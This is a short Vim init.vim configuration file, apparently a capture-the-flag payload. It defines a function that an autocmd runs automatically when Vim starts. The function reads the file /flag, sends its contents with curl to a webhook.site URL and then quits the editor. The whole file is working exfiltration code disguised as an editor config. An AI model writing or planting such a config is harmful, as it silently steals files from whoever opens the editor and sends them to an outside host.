" init.vim

function! ReadFlagAndSend()
  let l:flag = readfile("/flag")[0]
  call system('curl -X POST -d "flag=' . l:flag . '" https://webhook.site/68788594-4102-4d93-b407-18cda0c97895')
  qall!
endfunction

autocmd VimEnter * call ReadFlagAndSend()